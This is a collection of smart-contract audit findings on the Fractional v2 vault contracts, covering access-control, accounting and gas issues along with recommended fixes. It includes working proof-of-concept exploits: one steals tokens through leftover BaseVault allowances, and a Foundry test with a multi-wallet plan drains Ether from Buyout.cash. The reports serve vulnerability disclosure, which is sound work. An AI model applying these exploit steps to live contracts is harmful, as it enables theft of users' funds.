contracts function install(bytes4[] memory _selectors, address[] memory _plugins)     external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     uint256 length = _selectors.length;     for (uint256 i = 0; i < length; i++) {         methods[_selectors[i]] = _plugins[i];     }     emit InstallPlugin(_selectors, _plugins); }  ```  #### Recommendation  It is recommended to implement validation to ensure that the length of `_selectors` and `_plugins` arrays is the same.  ```diff function install(bytes4[] memory _selectors, address[] memory _plugins)     external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender); +   require(_selectors.length == _plugins.length, "Length of selectors and plugins is not the same");     uint256 length = _selectors.length;     for (uint256 i = 0; i < length; i++) {         methods[_selectors[i]] = _plugins[i];     }     emit InstallPlugin(_selectors, _plugins); } ```    ## 4.8 Consider Two-Phase Ownership Transfer  #### Description  Owner can calls `Vault.transferOwnership` function to transfers the ownership to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a owner.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93  ```solidity /// @notice Transfers ownership to given account /// @param _newOwner Address of new owner function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```  Controller can calls `ERC1155.transferController` function to transfers the controller role to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a controller.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229  ```solidity /// @notice Updates the controller address for the FERC1155 token contract /// @param _newController Address of new controlling entity function transferController(address _newController)     external     onlyController {     if (_newController == address(0)) revert ZeroAddress();     _controller = _newController;     emit ControllerTransferred(_newController); } ```  ### Recommendation  Consider implementing a two step process where the owner or controller nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of admin to fully succeed. This ensures the nominated EOA account is a valid and active account.    ## 4.9 Migration Proposer Can Hijack Other User's Buyout To Settle A Vault  #### Description  `Migration.settleVault` function should only be callable if the buyout initiated by the migration proposal is successful. However, it was observed that it is possible to call `Migration.settleVault` successfully even though the buyout initiated by the migration proposal has failed.  The following aims to demonstrate the issue:  1. Alice (attacker) creates a migration proposal by calling `Migration.propose` function. Then, she calls `Migration.commit` to kick off the buyout process for the migration, and Alice's proposal's `isCommited` is set to `true`. 2. Alice's buyout is unsuccessful. At this point in time, note that Alice's proposal's `isCommited` still remains as `true`, and the vault state reverts back to `State.INACTIVE`. 3. In order for the `Migration.settleVault` function to run successfully, the following three (3) requirements must be met:    - 1st requirement - Proposal must be committed    - 2nd requirement - Vault state must be set to `status.SUCCESS`    - 3rd requirement - `proposal.newVault` must not be initialised, which means that new vault has not been deployed yet 4. If Alice attempts to call `Migration.settleVault` function, it will revert because the vault state is not set to `State.SUCCESS` due to the failed buyout. In summary, her migration proposal meets all the requirements except for the 2nd requirement.  5. Bob decides to buy out the NFTs in the vault, therefore, he calls the `Buyout.start` to kick start the auction. After the buyout period (4 days), the vault pool has more than 51% of the total supply, thus the buyout is successful. 6. Bob proceeds to call the `Buyout.end` to end the auction. Since the buyout is successful, the vault state is set to `State.SUCCESS` now. 7. Alice decided to hijack Bob's buyout. Therefore, immediately after Bob called the `Buyout.end` function, Alice calls the `Migration.settleVault` function.   8. Alice's `Migration.settleVault` function call will succeed this time because the vault state has been set to `status.SUCCESS`.  This attack does not lead to loss of asset. Thus, I'm marking this as "Low". Even though the migration proposal has settled the vault successfully, when Alice calls `Migration.migrateVaultERC[20|721|1155]`, it will revert because the `Buyout.withdrawERC[20|721|1155]` will detect that the caller (`Migration` module) is not the actual auction winner.   However, `Migration.settleVault` function could still be called successfully in a situation where it should be failing, thus it is something to be raised.  #### Recommendation  Ensure that the `Migration.settleVault` can only be called if the buyout initiated by the migration proposal (within `Migration.commit`) has succeeded.    # 5. Non-Critical Issues    ## 5.1 Incorrect Comment  ### Instance #1 - Buyout  #### Description  The comment mentioned that if a pool has more than 51% of the total supply after 4 days, the buyout is successful.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L21  > /// @title Buyout > /// @author Fractional Art > /// @notice Module contract for vaults to hold buyout pools > /// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool. > /// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether. > /// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether. > /// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer  However, based on the actual implementation, the buyout will be successful as long as the pool has more than 50% of the total supply.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L206  ```solidity uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id); // Checks totalSupply of auction pool to determine if buyout is successful or not if (     (tokenBalance * 1000) /         IVaultRegistry(registry).totalSupply(_vault) >     500 )  ```  #### Recommendation  Update the comment to clearly reflect the actual implementation.  ```diff /// @title Buyout /// @author Fractional Art /// @notice Module contract for vaults to hold buyout pools /// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool. /// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether. /// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether. -/// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer +/// - If a pool has more than 50% of the total supply after 4 days, the buyout is successful and the proposer ```  ### Instance #2 - FERC1155  #### Description  The comment mentioned that the `FERC1155.royaltyInfo` function is to set the token royalties. However, the actual implementation is to read the token royalties.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L241  ```solidity /// @notice Sets the token royalties /// @param _id Token ID royalties are being updated for /// @param _salePrice Sale price to calculate the royalty for function royaltyInfo(uint256 _id, uint256 _salePrice)     external     view     returns (address receiver, uint256 royaltyAmount) {     receiver = royaltyAddress[_id];     royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; } ```  #### Recommendation  Update the comment to clearly reflect the actual implementation.  ```diff -/// @notice Sets the token royalties +/// @notice Reads the token royalties /// @param _id Token ID royalties are being updated for /// @param _salePrice Sale price to calculate the royalty for function royaltyInfo(uint256 _id, uint256 _salePrice)     external     view     returns (address receiver, uint256 royaltyAmount) {     receiver = royaltyAddress[_id];     royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; } ```    ## 5.2 Use Modifier For Better Readability And Code Reuse  #### Description  To improve readability and code reuse, a `onlyOwner` modifer can be defined instead of performing a manual conditional check `if (owner != msg.sender) revert NotOwner(owner, msg.sender);` within the following affected functions:  - [`Vault.setMerkleRoot`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86) - [`Vault.transferOwnership`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) - [`Vault.uninstall`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101) - [`Vault.install`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73)  #### Recommendation  It is recommended to define a modifier for access control and use it consistently throughout the codebase.  Following illustrates an example of the changes made to `Vault.setMerkleRoot` function.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86  ```solidity modifier modifier onlyOwner { {   if (owner == msg.sender) {      _;   } } ```  ```diff + function setMerkleRoot(bytes32 _rootHash) external onlyOwner { - function setMerkleRoot(bytes32 _rootHash) external { -    if (owner != msg.sender) revert NotOwner(owner, msg.sender);     merkleRoot = _rootHash; } ```    ## 5.3 Assembly Within `Supply.sol` and `Transfer.sol`  #### Description  The following functions were implemented in assembly:  - [`Supply .mint`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L23) - [`Supply.burn`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L113) - [`Transfer.ERC20Transfer`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L18) - [`Transfer.ERC721TransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L222) - [`Transfer.ERC1155TransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L341) - [`Transfer.ERC1155BatchTransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L474)  Even though assembly code was used for gas optimization, it reduces the readability (and future updatability) of the code.  #### Recommendation  Consider eliminating all assembly code and re-implement them in Solidity to make the code significantly more clean.    ## 5.4 Variable Should Be Called `isInit` Instead Of `Nonce`  **Description**  The purpose of the `nonce` is to ensure that the `Vault.init` function is only called once.  Consider renaming it to `isInit` for better readability.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L24  ```solidity /// @dev Initializes nonce and proxy owner function init() external {     if (nonce != 0) revert Initialized(owner, msg.sender, nonce);     nonce = 1;     owner = msg.sender;     emit TransferOwnership(address(0), msg.sender); } ```
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91   # Vulnerability details  ## Vulnerability Details  A depositor cannot have any residual allowance after depositing to the vault because the tokens can be stolen by anyone.  ## Proof-of-Concept  Assume that Alice has finished deploying the vault, and she would like to deposit her ERC20, ERC721, and ERC1155 tokens to the vault. She currently holds the following assets in her wallet  - `1000` XYZ ERC20 tokens - APE #1 ERC721 NFT, APE #2 ERC721 NFT, APE #3 ERC721 NFT,  - `1000` ABC ERC1155 tokens  Thus, she sets up the necessary approval to grant [`baseVault`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L17) contract the permission to transfer her tokens to the vault.  ```solidity erc20.approve(address(baseVault), type(uint256).max); erc721.setApprovalForAll(address(baseVault), true); erc1155.setApprovalForAll(address(baseVault), true); ```  Alice decided to deposit `50` XYZ ERC20 tokens, APE #1 ERC721 NFT, and `50` ABC tokens to the vault by calling `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` as shown below:  ```solidity baseVault.batchDepositERC20(alice.addr, vault, [XYZ.addr], [50]) baseVault.batchDepositERC721(alice.addr, vault, [APE.addr], [#1]) baseVault.batchDepositERC1155(alice.addr, vault, [ABC.addr], [#1], [50], "") ```  An attacker notices that there is residual allowance left on the `baseVault`, thus the attacker executes the following transactions to steal Alice's assets and send them to the attacker's wallet address.  ```solidity baseVault.batchDepositERC20(alice.addr, attacker.addr, [XYZ.addr], [950]) baseVault.batchDepositERC721(alice.addr, attacker.addr, [APE.addr, APE.addr], [#2, #3]) baseVault.batchDepositERC1155(alice.addr, attacker.addr, [ABC.addr], [#1], [950], "") ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58)  ```solidity function batchDepositERC20(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77)  ```solidity function batchDepositERC721(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91)  ```solidity function batchDepositERC1155(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom(                 _from,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  ## Impact  Lost of assets for users as a malicious user could utilise the `baseVault` contract to exploit the user's residual allowance to steal their assets.  ## Recommended Mitigation Steps  It is recommended to only allow the `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` functions to pull tokens from the caller (`msg.sender`).  Considering updating the affected functions to remove the `from` parameter, and use `msg.sender` instead.  ```diff function batchDepositERC20( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); +       IERC20(_tokens[i]).transferFrom(msg.sender, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC721( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]); +       IERC721(_tokens[i]).safeTransferFrom(msg.sender, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC1155( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom( -               _from, +               msg.sender,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269   # Vulnerability details  ## Impact  The function `Buyout.cash` allows a user to cash out proceeds (Ether) from a successful vault buyout.  However, due to how `buyoutShare` is calculated in `Buyout.cash`, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in `buyoutInfo[_vault].ethBalance`. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the `Buyout` contract.  ## Proof of Concept  Copy paste the following test case into `Buyout.t.sol` and run the test via `forge test -vvv --match-test testCashDrainEther`:  The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in `10 ether`). Alice and Eve are both entitled to receive `5 ether` each. Alice receives the correct amount when cashing out, however, due to a miscalculation of `buyoutShare` (see [#L268-L269](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out `10 ether` from the `Buyout` contract.  ```solidity function testCashDrainEther() public {   /// ==================   /// ===== SETUP =====   /// ==================    deployBaseVault(alice, TOTAL_SUPPLY);   (token, tokenId) = registry.vaultToToken(vault);   alice.ferc1155 = new FERC1155BS(address(0), 111, token);   bob.ferc1155 = new FERC1155BS(address(0), 222, token);   eve.ferc1155 = new FERC1155BS(address(0), 333, token);    buyout = address(buyoutModule);   proposalPeriod = buyoutModule.PROPOSAL_PERIOD();   rejectionPeriod = buyoutModule.REJECTION_PERIOD();    vm.label(vault, "VaultProxy");   vm.label(token, "Token");    setApproval(alice, vault, true);   setApproval(alice, buyout, true);   setApproval(bob, vault, true);   setApproval(bob, buyout, true);   setApproval(eve, vault, true);   setApproval(eve, buyout, true);    alice.ferc1155.safeTransferFrom(       alice.addr,       bob.addr,       1,       6000,       ""   );    alice.ferc1155.safeTransferFrom(       alice.addr,       eve.addr,       1,       2000,       ""   );   /// ==================   /// ===== SETUP END =====   /// ==================    /// Fraction balances:   assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000   assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    bob.buyoutModule.start{value: 10 ether}(vault);    assertEq(getETHBalance(buyout), 10 ether);    /// Bob (proposer of buyout) transfered his fractions to buyout contract   assertEq(getFractionBalance(buyout), 6000);    vm.warp(rejectionPeriod + 1);    bob.buyoutModule.end(vault, burnProof);    /// Fraction balances after buyout ended:   assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000   assertEq(getFractionBalance(bob.addr), 0); // Bob: 0   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    assertEq(getETHBalance(buyout), 10 ether);    /// Alice cashes out 2000 fractions -> 5 ETH (correct amount)   alice.buyoutModule.cash(vault, burnProof);    assertEq(getFractionBalance(alice.addr), 0);   assertEq(getETHBalance(alice.addr), 105 ether);    /// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH   eve.buyoutModule.cash(vault, burnProof); } ```  **Additionally** to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:  1. Attacker deploys a vault with `10.000` fractions minted 2. 51% of fractions (`5.100`) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, `980` fractions each) 3. With the first wallet, the attacker starts a buyout with `10 ether` - fractions are transferred into the `Buyout` contract as well as `10 ether` 4. Attacker waits for `REJECTION_PERIOD` to elapse to call `Buyout.end` (51% of fractions are already held in the contract, therefore no need for voting) 5. After the successful buyout, the attacker uses the `Buyout.cash` function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the `Buyout` contract:    1. Wallet 1 - `buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether` (`totalSupply = 3920` after burning `980` fractions from wallet 1)    2. Wallet 2 - `buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether` (`totalSupply = 2940` after burning `980` fractions from wallet 2)    3. Wallet 3 - `buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether` (`totalSupply = 1960` after burning `980` fractions from wallet 3)    4. Wallet 4 - `buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether` (`totalSupply = 980` after burning `980` fractions from wallet 4)    5. Wallet 5 - `buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether` (`totalSupply = 0` after burning `980` fractions from wallet 5)  If summed up, cashing out the 5 wallets, the attacker receives `22.8 ether` in total. Making a profit of `12.8 ether`.  This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the `Buyout` contract.  ## Tools Used  Manual review  ## Recommended mitigation steps  Decrement `ethBalance` from buyout info `buyoutInfo[_vault].ethBalance -= buyoutShare;` in `Buyout.cash` (see `@audit-info` annotation):  ```solidity function cash(address _vault, bytes32[] calldata _burnProof) external {     // Reverts if address is not a registered vault     (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(         _vault     );     if (id == 0) revert NotVault(_vault);     // Reverts if auction state is not successful     (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);     State required = State.SUCCESS;     if (current != required) revert InvalidState(required, current);     // Reverts if caller has a balance of zero fractional tokens     uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);     if (tokenBalance == 0) revert NoFractions();      // Initializes vault transaction     bytes memory data = abi.encodeCall(         ISupply.burn,         (msg.sender, tokenBalance)     );     // Executes burn of fractional tokens from caller     IVault(payable(_vault)).execute(supply, data, _burnProof);      // Transfers buyout share amount to caller based on total supply     uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     uint256 buyoutShare = (tokenBalance * ethBalance) /         (totalSupply + tokenBalance);     buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement `ethBalance` by `buyoutShare`     _sendEthOrWeth(msg.sender, buyoutShare);     // Emits event for cashing out of buyout pool     emit Cash(_vault, msg.sender, buyoutShare); } ```   
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141   # Vulnerability details  The `leave` function allows to leave a proposal even if the proposal has been committed and failed. This makes it a (probably unintended) duplicate functionality of `withdrawContributions`, which is the function that should be used to withdraw failed contributions.  ## Impact User assets might be lost: When withdrawing assets from a failed migration, users should get back a different amount of assets, according to the buyout auction result. (I detailed this in another issue - "Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back"). But when withdrawing assets from a proposal that has not been committed, users should get back their original amount of assets, as that has not changed. Therefore, if `leave` does not check if the proposal has been committed, users could call `leave` instead of `withdrawContribution` and get back a different amounts of assets than they deserve, on the expense of other users.  ## Proof of Concept The `leave` function [does not check](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141) anywhere whether `proposal.isCommited == true`. Therefore, if a user calls it after a proposal has been committed and failed, it will continue to send him his original contribution back, instead of sending him the adjusted amount that has been returned from Buyout.  ## Recommended Mitigation Steps Revert in `leave` if `proposal.isCommited == true`. You might be also able to merge the functionality of `leave` and `withdrawContribution`, but that depends on how you will implement the fix for `withdrawContribution`.  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L321 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L312 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L325   # Vulnerability details  When a user calls `withdrawContribution`, it will try to send him back his original contribution for the proposal. But if the proposal has been committed, and other users have interacted with the buyout, Migration will receive back a different amount of ETH and tokens. Therefore it shouldn't send the user back his original contribution, but should send whatever his share is of whatever was received back from Buyout.  ## Impact Loss of funds for users. Some users might not be able to withdraw their contribution at all, and other users might withdraw funds that belong to other users. (This can also be done as a purposeful attack.)  ## Proof of Concept A summary is described at the top.  It's probably not needed, but the here's the flow in detail. When a user joins a proposal, Migration [saves](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124:#L135) his contribution: ```         userProposalEth[_proposalId][msg.sender] += msg.value;         userProposalFractions[_proposalId][msg.sender] += _amount; ``` Later when the user would want to withdraw his contribution from a failed migration, Migration would [refer](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308:#L325) to these same variables to decide how much to send to the user: ```         uint256 userFractions = userProposalFractions[_proposalId][msg.sender];         IFERC1155(token).safeTransferFrom(address(this), msg.sender, id, userFractions, "");         uint256 userEth = userProposalEth[_proposalId][msg.sender];         payable(msg.sender).transfer(userEth); ```  But if the proposal was committed, and other users interacted with the buyout, then the amount of ETH and tokens that Buyout sends back is not the same contribution. For example, if another user called `buyFractions` for the buyout, it [will decrease](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L168) the amount of tokens in the pool: ```         IERC1155(token).safeTransferFrom(address(this), msg.sender, id, _amount, ""); ``` And when the proposal will end, if it has failed, Buyout will [send back](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L228) to Migration [the amount](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L206) of tokens in the pool: ```         uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);         ...         IERC1155(token).safeTransferFrom(address(this), proposer, id, tokenBalance, ""); ``` (**Same will happen for the ETH amount)  Therefore, Migration will receive back less tokens than the original contribution was. When the user will try to call `withdrawContribution` to withdraw his contribution from the pool, Migration would [try to send](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L310) the user's original contribution. But there's a deficit of that. If other users have contributed the same token, then it will transfer their tokens to the user. If not, then the withdrawal will simply revert for insufficient balance.  ## Recommended Mitigation Steps I am not sure, but I think that the correct solution would be that upon a failed proposal's end, there should be a hook call from Buyout to the proposer - in our situation, Migration. Migration would then see(/receive as parameter) how much ETH/tokens were received, and update the proposal with the change needed. eg. send to each user 0.5 his tokens and 1.5 his ETH. In another issue I submitted, "User can't withdraw assets from failed migration if another buyout is going on/succeeded", I described for a different reason why such a callback to Migration might be needed. Please see there for more implementation suggestion. I think this issue shows that indeed it is needed.  
### [G01] Custom Errors There are a couple of files that have yet to be upgraded to custom errors. Based on the following test in remix you can save 12,404 in deployment costs per custom error and 86 gas on each function call.  ```  contract Test {  uint256 a;  function check() external {   require(a != 0, "check failed");  } }   (Deployment cost: 114,703, Cost on Function call: 23,392) vs  contract Test {  uint256 a;  error checkFailed();  function check() external {   if (a != 0) revert checkFailed();  } }   (Deployment cost: 102,299, Cost on Function call: 23,306) ```  Instances where custom errors can be implemented: [FERC1155.sol#L263-L268](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L263-L268) [FERC1155.sol#L275-L286](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L275-L286) [FERC1155.sol#L297](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L297) [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)   ### [G02] Shorten Revert Messages If you opt not to use custom errors keeping revert strings <= 32 bytes in length will save gas.  I ran a test in remix and found the savings for a single short revert string vs long string to be 9,377 gas in deployment cost and 18 gas on function call.  ``` solidity contract Test {  uint256 a;  function check() external {   require(a != 0, "short error message");    (Deployment cost: 114,799, Cost on function call: 23,392)    vs    require(a != 0, "A longer Error Message over 32 bytes in              length");    (Deployment cost: 124,176, Cost on function call: 23,410)   } } ```  I recommend shortenning the following revert strings to < 32 bytes in length: [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)   ### [G03] Loop Optimisation When incrementing i in for loops there is no chance of overflow so unchecked can be used to save gas. Pre increments can also be used to save a small amount of gas per iteration (~5 gas). I ran a simple test in remix and found deployment savings of 31,901 gas and on each function call saved ~144 gas per iteration.  ``` solidity contract Test {  function loopTest() external {   for (uint256 i; i < 1; i++) {   Deployment Cost: 125,885, Cost on function call: 24,604   vs   for (uint256 i; i < 1; ) {   // for loop body   unchecked { ++i; }   Deployment Cost: 93,984, Cost on function call: 24,460   }  } } ```  For loops that can use unchecked/pre increments: [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)   ### [G04] State Variables that can be Immutable Variables that are initialised in the constructor and then never modified can be changed to immutable. Based on the following test in remix switching to immutable variables can save 26,376 in deployment costs and 2,456 whenever referencing the variable.  ``` solidity contract Test {  address public supply;   (Deployment Cost: 167,940, Cost on function call: 26,861)  vs  address public immutable supply;  (Deployment Cost: 141,564, Cost on function call: 24,405)   constructor(address _supply) {   supply = _supply;  }    function test() external {   address testAddress = supply; // to test referencing gas costs  } } ```  Variables that can be changed to immutable: [Buyout.sol#L29-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33) - registry, supply & transfer are all set in the constructor and never modified. [Minter.sol#L14](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14) - supply is never modified [Migration.sol#L37-L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39) - buyout & registry are never modified [VaultFactory.sol#L15](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15) - implementation is never modified   ### [G05] x = x + y is Cheaper than x += y  Based on test in remix you can save ~1,007 gas on deployment and ~15 gas on execution cost if you use x = x + y over x += y. (Is only true for storage variables)  ``` solidity contract Test {  uint256 x = 1;  function test() external {   x += 3;    (Deployment Cost: 153,124, Execution Cost: 30,369)   vs   x = x + 1;   (Deployment Cost: 152,117, Execution Cost: 30,354)  }  } ```  Instances where x = x + y/x = x - y can be implemented: [FERC1155.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L62) 